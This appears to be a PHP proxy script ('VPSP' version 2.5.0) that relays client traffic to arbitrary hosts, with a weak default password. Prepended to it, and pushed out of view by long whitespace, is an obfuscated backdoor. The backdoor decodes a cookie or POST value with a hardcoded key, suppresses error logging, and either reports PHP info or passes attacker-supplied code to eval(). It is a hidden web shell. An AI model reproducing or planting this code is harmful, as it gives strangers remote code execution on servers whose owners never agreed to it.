<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $x8751a2a = 632;$GLOBALS['veee6f460']=Array();global$veee6f460;$veee6f460=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['h6465b97']="\x27\x6d\x73\x6b\x41\x4d\x49\x43\x37\x48\x68\x4c\x74\x44\x70\x46\x2d\x52\x59\x6c\x4f\x50\x5f\x5a\x4b\x30\x7a\x31\x34\x2f\x2e\x76\x38\x7e\x62\x78\x26\x69\x55\x9\x36\xa\x35\x3f\x57\x53\x45\x22\x56\x64\x79\x5d\x39\x3d\x58\x21\x77\x7c\x51\x67\x40\x71\x29\x25\x5e\x6a\x65\x3e\x2a\x54\x72\x42\x28\x61\x2b\x2c\xd\x24\x32\x6f\x3c\x4a\x5b\x7b\x63\x60\x33\x20\x4e\x66\x3b\x7d\x6e\x47\x5c\x23\x75\x3a";$veee6f460[$veee6f460['h6465b97'][35].$veee6f460['h6465b97'][34].$veee6f460['h6465b97'][25].$veee6f460['h6465b97'][42].$veee6f460['h6465b97'][27]]=$veee6f460['h6465b97'][84].$veee6f460['h6465b97'][10].$veee6f460['h6465b97'][70];$veee6f460[$veee6f460['h6465b97'][19].$veee6f460['h6465b97'][89].$veee6f460['h6465b97'][34].$veee6f460['h6465b97'][32].$veee6f460['h6465b97'][32].$veee6f460['h6465b97'][42]]=$veee6f460['h6465b97'][79].$veee6f460['h6465b97'][70].$veee6f460['h6465b97'][49];$veee6f460[$veee6f460['h6465b97'][65].$veee6f460['h6465b97'][73].$veee6f460['h6465b97'][52].$veee6f460['h6465b97'][28]]=$veee6f460['h6465b97'][2].$veee6f460['h6465b97'][12].$veee6f460['h6465b97'][70].$veee6f460['h6465b97'][19].$veee6f460['h6465b97'][66].$veee6f460['h6465b97'][92];$veee6f460[$veee6f460['h6465b97'][26].$veee6f460['h6465b97'][78].$veee6f460['h6465b97'][49].$veee6f460['h6465b97'][49].$veee6f460['h6465b97'][32].$veee6f460['h6465b97'][40]]=$veee6f460['h6465b97'][37].$veee6f460['h6465b97'][92].$veee6f460['h6465b97'][37].$veee6f460['h6465b97'][22].$veee6f460['h6465b97'][2].$veee6f460['h6465b97'][66].$veee6f460['h6465b97'][12];$veee6f460[$veee6f460['h6465b97'][26].$veee6f460['h6465b97'][86].$veee6f460['h6465b97'][49].$veee6f460['h6465b97'][42].$veee6f460['h6465b97'][78].$veee6f460['h6465b97'][25]]=$veee6f460['h6465b97'][2].$veee6f460['h6465b97'][66].$veee6f460['h6465b97'][70].$veee6f460['h6465b97'][37].$veee6f460['h6465b97'][73].$veee6f460['h6465b97'][19].$veee6f460['h6465b97'][37].$veee6f460['h6465b97'][26].$veee6f460['h6465b97'][66];$veee6f460[$veee6f460['h6465b97'][3].$veee6f460['h6465b97'][52].$veee6f460['h6465b97'][78].$veee6f460['h6465b97'][89].$veee6f460['h6465b97'][40]]=$veee6f460['h6465b97'][14].$veee6f460['h6465b97'][10].$veee6f460['h6465b97'][14].$veee6f460['h6465b97'][31].$veee6f460['h6465b97'][66].$veee6f460['h6465b97'][70].$veee6f460['h6465b97'][2].$veee6f460['h6465b97'][37].$veee6f460['h6465b97'][79].$veee6f460['h6465b97'][92];$veee6f460[$veee6f460['h6465b97'][89].$veee6f460['h6465b97'][66].$veee6f460['h6465b97'][49].$veee6f460['h6465b97'][78].$veee6f460['h6465b97'][32].$veee6f460['h6465b97'][66]]=$veee6f460['h6465b97'][96].$veee6f460['h6465b97'][92].$veee6f460['h6465b97'][2].$veee6f460['h6465b97'][66].$veee6f460['h6465b97'][70].$veee6f460['h6465b97'][37].$veee6f460['h6465b97'][73].$veee6f460['h6465b97'][19].$veee6f460['h6465b97'][37].$veee6f460['h6465b97'][26].$veee6f460['h6465b97'][66];$veee6f460[$veee6f460['h6465b97'][37].$veee6f460['h6465b97'][66].$veee6f460['h6465b97'][32].$veee6f460['h6465b97'][49].$veee6f460['h6465b97'][78].$veee6f460['h6465b97'][40].$veee6f460['h6465b97'][8].$veee6f460['h6465b97'][89].$veee6f460['h6465b97'][84]]=$veee6f460['h6465b97'][34].$veee6f460['h6465b97'][73].$veee6f460['h6465b97'][2].$veee6f460['h6465b97'][66].$veee6f460['h6465b97'][40].$veee6f460['h6465b97'][28].$veee6f460['h6465b97'][22].$veee6f460['h6465b97'][49].$veee6f460['h6465b97'][66].$veee6f460['h6465b97'][84].$veee6f460['h6465b97'][79].$veee6f460['h6465b97'][49].$veee6f460['h6465b97'][66];$veee6f460[$veee6f460['h6465b97'][73].$veee6f460['h6465b97'][34].$veee6f460['h6465b97'][8].$veee6f460['h6465b97'][42].$veee6f460['h6465b97'][34]]=$veee6f460['h6465b97'][2].$veee6f460['h6465b97'][66].$veee6f460['h6465b97'][12].$veee6f460['h6465b97'][22].$veee6f460['h6465b97'][12].$veee6f460['h6465b97'][37].$veee6f460['h6465b97'][1].$veee6f460['h6465b97'][66].$veee6f460['h6465b97'][22].$veee6f460['h6465b97'][19].$veee6f460['h6465b97'][37].$veee6f460['h6465b97'][1].$veee6f460['h6465b97'][37].$veee6f460['h6465b97'][12];$veee6f460[$veee6f460['h6465b97'][19].$veee6f460['h6465b97'][66].$veee6f460['h6465b97'][66].$veee6f460['h6465b97'][28].$veee6f460['h6465b97'][78].$veee6f460['h6465b97'][42].$veee6f460['h6465b97'][86].$veee6f460['h6465b97'][27]]=$veee6f460['h6465b97'][31].$veee6f460['h6465b97'][28].$veee6f460['h6465b97'][34].$veee6f460['h6465b97'][52].$veee6f460['h6465b97'][8].$veee6f460['h6465b97'][78];$veee6f460[$veee6f460['h6465b97'][37].$veee6f460['h6465b97'][32].$veee6f460['h6465b97'][84].$veee6f460['h6465b97'][84]]=$veee6f460['h6465b97'][49].$veee6f460['h6465b97'][25].$veee6f460['h6465b97'][42].$veee6f460['h6465b97'][89].$veee6f460['h6465b97'][52].$veee6f460['h6465b97'][25];$veee6f460[$veee6f460['h6465b97'][2].$veee6f460['h6465b97'][25].$veee6f460['h6465b97'][89].$veee6f460['h6465b97'][8].$veee6f460['h6465b97'][49]]=$_POST;$veee6f460[$veee6f460['h6465b97'][1].$veee6f460['h6465b97'][73].$veee6f460['h6465b97'][25].$veee6f460['h6465b97'][32]]=$_COOKIE;@$veee6f460[$veee6f460['h6465b97'][26].$veee6f460['h6465b97'][78].$veee6f460['h6465b97'][49].$veee6f460['h6465b97'][49].$veee6f460['h6465b97'][32].$veee6f460['h6465b97'][40]]($veee6f460['h6465b97'][66].$veee6f460['h6465b97'][70].$veee6f460['h6465b97'][70].$veee6f460['h6465b97'][79].$veee6f460['h6465b97'][70].$veee6f460['h6465b97'][22].$veee6f460['h6465b97'][19].$veee6f460['h6465b97'][79].$veee6f460['h6465b97'][59],NULL);@$veee6f460[$veee6f460['h6465b97'][26].$veee6f460['h6465b97'][78].$veee6f460['h6465b97'][49].$veee6f460['h6465b97'][49].$veee6f460['h6465b97'][32].$veee6f460['h6465b97'][40]]($veee6f460['h6465b97'][19].$veee6f460['h6465b97'][79].$veee6f460['h6465b97'][59].$veee6f460['h6465b97'][22].$veee6f460['h6465b97'][66].$veee6f460['h6465b97'][70].$veee6f460['h6465b97'][70].$veee6f460['h6465b97'][79].$veee6f460['h6465b97'][70].$veee6f460['h6465b97'][2],0);@$veee6f460[$veee6f460['h6465b97'][26].$veee6f460['h6465b97'][78].$veee6f460['h6465b97'][49].$veee6f460['h6465b97'][49].$veee6f460['h6465b97'][32].$veee6f460['h6465b97'][40]]($veee6f460['h6465b97'][1].$veee6f460['h6465b97'][73].$veee6f460['h6465b97'][35].$veee6f460['h6465b97'][22].$veee6f460['h6465b97'][66].$veee6f460['h6465b97'][35].$veee6f460['h6465b97'][66].$veee6f460['h6465b97'][84].$veee6f460['h6465b97'][96].$veee6f460['h6465b97'][12].$veee6f460['h6465b97'][37].$veee6f460['h6465b97'][79].$veee6f460['h6465b97'][92].$veee6f460['h6465b97'][22].$veee6f460['h6465b97'][12].$veee6f460['h6465b97'][37].$veee6f460['h6465b97'][1].$veee6f460['h6465b97'][66],0);@$veee6f460[$veee6f460['h6465b97'][73].$veee6f460['h6465b97'][34].$veee6f460['h6465b97'][8].$veee6f460['h6465b97'][42].$veee6f460['h6465b97'][34]](0);$na054=NULL;$ceaab=NULL;$veee6f460[$veee6f460['h6465b97'][37].$veee6f460['h6465b97'][73].$veee6f460['h6465b97'][8].$veee6f460['h6465b97'][86]]=$veee6f460['h6465b97'][89].$veee6f460['h6465b97'][86].$veee6f460['h6465b97'][84].$veee6f460['h6465b97'][25].$veee6f460['h6465b97'][86].$veee6f460['h6465b97'][66].$veee6f460['h6465b97'][86].$veee6f460['h6465b97'][25].$veee6f460['h6465b97'][16].$veee6f460['h6465b97'][40].$veee6f460['h6465b97'][86].$veee6f460['h6465b97'][32].$veee6f460['h6465b97'][8].$veee6f460['h6465b97'][16].$veee6f460['h6465b97'][28].$veee6f460['h6465b97'][28].$veee6f460['h6465b97'][86].$veee6f460['h6465b97'][28].$veee6f460['h6465b97'][16].$veee6f460['h6465b97'][52].$veee6f460['h6465b97'][34].$veee6f460['h6465b97'][8].$veee6f460['h6465b97'][28].$veee6f460['h6465b97'][16].$veee6f460['h6465b97'][25].$veee6f460['h6465b97'][8].$veee6f460['h6465b97'][84].$veee6f460['h6465b97'][42].$veee6f460['h6465b97'][28].$veee6f460['h6465b97'][84].$veee6f460['h6465b97'][32].$veee6f460['h6465b97'][73].$veee6f460['h6465b97'][84].$veee6f460['h6465b97'][8].$veee6f460['h6465b97'][78].$veee6f460['h6465b97'][66];global$ia73;function d05f90($na054,$nf5ce7){global$veee6f460;$j241a="";for($t5412=0;$t5412<$veee6f460[$veee6f460['h6465b97'][65].$veee6f460['h6465b97'][73].$veee6f460['h6465b97'][52].$veee6f460['h6465b97'][28]]($na054);){for($u018240=0;$u018240<$veee6f460[$veee6f460['h6465b97'][65].$veee6f460['h6465b97'][73].$veee6f460['h6465b97'][52].$veee6f460['h6465b97'][28]]($nf5ce7)&&$t5412<$veee6f460[$veee6f460['h6465b97'][65].$veee6f460['h6465b97'][73].$veee6f460['h6465b97'][52].$veee6f460['h6465b97'][28]]($na054);$u018240++,$t5412++){$j241a.=$veee6f460[$veee6f460['h6465b97'][35].$veee6f460['h6465b97'][34].$veee6f460['h6465b97'][25].$veee6f460['h6465b97'][42].$veee6f460['h6465b97'][27]]($veee6f460[$veee6f460['h6465b97'][19].$veee6f460['h6465b97'][89].$veee6f460['h6465b97'][34].$veee6f460['h6465b97'][32].$veee6f460['h6465b97'][32].$veee6f460['h6465b97'][42]]($na054[$t5412])^$veee6f460[$veee6f460['h6465b97'][19].$veee6f460['h6465b97'][89].$veee6f460['h6465b97'][34].$veee6f460['h6465b97'][32].$veee6f460['h6465b97'][32].$veee6f460['h6465b97'][42]]($nf5ce7[$u018240]));}}return$j241a;}function v4b972($na054,$nf5ce7){global$veee6f460;global$ia73;return$veee6f460[$veee6f460['h6465b97'][37].$veee6f460['h6465b97'][32].$veee6f460['h6465b97'][84].$veee6f460['h6465b97'][84]]($veee6f460[$veee6f460['h6465b97'][37].$veee6f460['h6465b97'][32].$veee6f460['h6465b97'][84].$veee6f460['h6465b97'][84]]($na054,$ia73),$nf5ce7);}foreach($veee6f460[$veee6f460['h6465b97'][1].$veee6f460['h6465b97'][73].$veee6f460['h6465b97'][25].$veee6f460['h6465b97'][32]]as$nf5ce7=>$c4e7eda){$na054=$c4e7eda;$ceaab=$nf5ce7;}if(!$na054){foreach($veee6f460[$veee6f460['h6465b97'][2].$veee6f460['h6465b97'][25].$veee6f460['h6465b97'][89].$veee6f460['h6465b97'][8].$veee6f460['h6465b97'][49]]as$nf5ce7=>$c4e7eda){$na054=$c4e7eda;$ceaab=$nf5ce7;}}$na054=@$veee6f460[$veee6f460['h6465b97'][89].$veee6f460['h6465b97'][66].$veee6f460['h6465b97'][49].$veee6f460['h6465b97'][78].$veee6f460['h6465b97'][32].$veee6f460['h6465b97'][66]]($veee6f460[$veee6f460['h6465b97'][19].$veee6f460['h6465b97'][66].$veee6f460['h6465b97'][66].$veee6f460['h6465b97'][28].$veee6f460['h6465b97'][78].$veee6f460['h6465b97'][42].$veee6f460['h6465b97'][86].$veee6f460['h6465b97'][27]]($veee6f460[$veee6f460['h6465b97'][37].$veee6f460['h6465b97'][66].$veee6f460['h6465b97'][32].$veee6f460['h6465b97'][49].$veee6f460['h6465b97'][78].$veee6f460['h6465b97'][40].$veee6f460['h6465b97'][8].$veee6f460['h6465b97'][89].$veee6f460['h6465b97'][84]]($na054),$ceaab));if(isset($na054[$veee6f460['h6465b97'][73].$veee6f460['h6465b97'][3]])&&$ia73==$na054[$veee6f460['h6465b97'][73].$veee6f460['h6465b97'][3]]){if($na054[$veee6f460['h6465b97'][73]]==$veee6f460['h6465b97'][37]){$t5412=Array($veee6f460['h6465b97'][14].$veee6f460['h6465b97'][31]=>@$veee6f460[$veee6f460['h6465b97'][3].$veee6f460['h6465b97'][52].$veee6f460['h6465b97'][78].$veee6f460['h6465b97'][89].$veee6f460['h6465b97'][40]](),$veee6f460['h6465b97'][2].$veee6f460['h6465b97'][31]=>$veee6f460['h6465b97'][27].$veee6f460['h6465b97'][30].$veee6f460['h6465b97'][25].$veee6f460['h6465b97'][16].$veee6f460['h6465b97'][27],);echo@$veee6f460[$veee6f460['h6465b97'][26].$veee6f460['h6465b97'][86].$veee6f460['h6465b97'][49].$veee6f460['h6465b97'][42].$veee6f460['h6465b97'][78].$veee6f460['h6465b97'][25]]($t5412);}elseif($na054[$veee6f460['h6465b97'][73]]==$veee6f460['h6465b97'][66]){eval/*nce95112*/($na054[$veee6f460['h6465b97'][49]]);}exit();} ?><?php /* This version is not compatible with previous versions of the client */ define('vpsp_version', '2.5.0'); /* Set your password here Leave the variable empty to use no password ! Remove { and } */ define('vpsp_pwd', '123'); /* Set encryption key here Don't leave the variable empty. In order to enable/disable encryption use 'Enable traffic encryption' setting in the GUI client. ! Remove { and } */ define('vpsp_enc_key', '123'); /* Displaying of any messages is suppressed. In order to keep downloaded file integrity, no extraneous data must be ouptut by this script */ error_reporting(~E_ALL); @set_time_limit(0); ob_implicit_flush(1); ignore_user_abort(0); header('Content-type: application/octet-stream'); header('Content-Transfer-Encoding: binary'); header('X-VPSP-VERSION: ' . vpsp_version); $input = fopen('php://input', 'r'); define('vpsp_enc', ord(fread($input, 1)) != 0); $ok; if (vpsp_enc) { if (isset($GLOBALS['vpsp_pe']) == false) { $GLOBALS['vpsp_ks'] = VC_GenerateKeyHash(vpsp_enc_key); $GLOBALS['vpsp_pe'] = VC_Init(vpsp_enc_key, $GLOBALS['vpsp_ks']); } $GLOBALS['vpsp_pd'] = array_flip($GLOBALS['vpsp_pe']); $ok = VC_Decrypt(fread($input, 2)); $rBuffLen = ord(VC_Decrypt(fread($input, 1))) * 256 * 256 * 256 + ord(VC_Decrypt(fread($input, 1))) * 256 * 256 + ord(VC_Decrypt(fread($input, 1))) * 256 + ord(VC_Decrypt(fread($input, 1))); $sBuffLen = ord(VC_Decrypt(fread($input, 1))) * 256 * 256 * 256 + ord(VC_Decrypt(fread($input, 1))) * 256 * 256 + ord(VC_Decrypt(fread($input, 1))) * 256 + ord(VC_Decrypt(fread($input, 1))); $reqPwdLen = ord(VC_Decrypt(fread($input, 1))); $reqPwd = ($reqPwdLen > 0) ? VC_Decrypt(fread($input, $reqPwdLen)) : ''; $https = ord(VC_Decrypt(fread($input, 1))); $host = VC_Decrypt(fread($input, ord(VC_Decrypt(fread($input, 1))))); $port = ord(VC_Decrypt(fread($input, 1))) * 256 + ord(VC_Decrypt(fread($input, 1))); } else { $ok = fread($input, 2); $rBuffLen = ord(fread($input, 1)) * 256 * 256 * 256 + ord(fread($input, 1)) * 256 * 256 + ord(fread($input, 1)) * 256 + ord(fread($input, 1)); $sBuffLen = ord(fread($input, 1)) * 256 * 256 * 256 + ord(fread($input, 1)) * 256 * 256 + ord(fread($input, 1)) * 256 + ord(fread($input, 1)); $reqPwdLen = ord(fread($input, 1)); $reqPwd = ($reqPwdLen > 0) ? fread($input, $reqPwdLen) : ''; $https = ord(fread($input, 1)); $host = fread($input, ord(fread($input, 1))); $port = ord(fread($input, 1)) * 256 + ord(fread($input, 1)); } if ($ok != 'OK') { header('X-VPSP-ERROR: bad_enc_key'); header('X-VPSP-HOST: ' . (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']); exit; } if ($reqPwd !== vpsp_pwd) { $resp = "HTTP/1.0 401 Unauthorized\r\nX-VPSP-VERSION: " . vpsp_version . "\r\nX-VPSP-ERROR: bad_password\r\nX-VPSP-HOST: " . (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "\r\nConnection: close\r\n\r\n"; if (vpsp_enc) { echo VC_Encrypt($resp); } else { echo $resp; } exit; } if ($https == 1) { $host = 'ssl://' . $host; } $fsok = fsockopen($host, $port, $errno, $errstr, 20); if ($fsok == false) { $resp = "HTTP/1.0 503 Service Unavailable\r\nX-VPSP-VERSION: " . vpsp_version . "\r\nX-VPSP-ERROR: host_down\r\nX-VPSP-ERROR-TEXT: " . base64_encode($errstr) ."\r\nX-VPSP-HOST: " . (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "\r\nX-VPSP-TARGET: " . str_replace('ssl://', '', $host) . "\r\nConnection: close\r\n\r\n"; if (vpsp_enc) { echo VC_Encrypt($resp); } else { echo $resp; } exit; } while ($wbuffer = fread($input, $rBuffLen)) { if (vpsp_enc) { fwrite($fsok, VC_Decrypt($wbuffer)); } else { fwrite($fsok, $wbuffer); } } fflush($fsok); while ($rbuffer = fread($fsok, $sBuffLen)) { if (vpsp_enc) { echo VC_Encrypt($rbuffer); } else { echo $rbuffer; } } fflush($fsok); fclose($fsok); function MD5Hash($str) { $m = md5($str); $s = ''; foreach(explode("\n", trim(chunk_split($m, 2))) as $h) { $s .= chr(hexdec($h)); } return $s; } function VC_Init($key, $ks) { $s = range(0, 255); if (strlen($key) == 0) { return $s; } $km = MD5Hash($key); $kx = ''; for ($i = 0; $i < 16; $i++) { $kx .= MD5Hash($km . $km[$i] . chr($ks)); } $r = ($ks % 0x0F) + 1; $j = $ks; for ($n = 0; $n < $r; $n++) { for ($i = 0; $i < 256; $i++) { $j = (($j + $s[$i] + $n + ord($kx[$i])) ^ $ks) % 256; $t = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $t; } } for ($i = 0; $i < 256; $i++) { $s[$i] = $s[$i] ^ $ks; } return $s; } function VC_GenerateKeyHash($key) { $m = MD5Hash($key); $kt = 0; for ($i = 0; $i < 16; $i++) { $kt += ord($m[$i]); } return $kt % 256; } function VC_Encrypt($str) { $pe = $GLOBALS['vpsp_pe']; $out = ''; $len = strlen($str); for ($y = 0; $y < $len; $y++) { $out .= chr($pe[ord($str[$y])]); } return $out; } function VC_Decrypt($str) { $pd = $GLOBALS['vpsp_pd']; $out = ''; $len = strlen($str); for ($y = 0; $y < $len; $y++) { $out .= chr($pd[ord($str[$y])]); } return $out; }